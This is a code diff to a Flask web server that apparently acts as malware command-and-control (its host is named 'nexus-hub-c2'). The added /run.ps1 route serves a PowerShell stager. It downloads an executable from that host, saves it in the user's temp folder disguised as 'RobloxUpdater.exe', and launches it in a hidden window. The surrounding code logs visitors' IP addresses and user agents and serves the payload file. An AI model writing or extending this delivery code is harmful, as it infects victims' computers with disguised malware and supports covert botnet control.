@@ -43,6 +43,17 @@ def raw_exe():
     log_hit(request.remote_addr, request.headers.get("User-Agent",""), "/raw_exe")
     return send_file(PAYLOAD_EXE, mimetype="application/octet-stream")
 
+@app.route("/run.ps1")
+def run_ps1():
+    log_hit(request.remote_addr, request.headers.get("User-Agent",""), "/run.ps1")
+    ps = (
+        '$u = "https://nexus-hub-c2.onrender.com/raw_exe"\n'
+        '$o = "$env:TEMP\\RobloxUpdater.exe"\n'
+        '(New-Object Net.WebClient).DownloadFile($u, $o)\n'
+        'Start-Process $o -WindowStyle Hidden\n'
+    )
+    return Response(ps, mimetype="text/plain")
+
 @app.route("/register", methods=["POST"])
 def register():
     data = request.get_json(silent=True) or {}
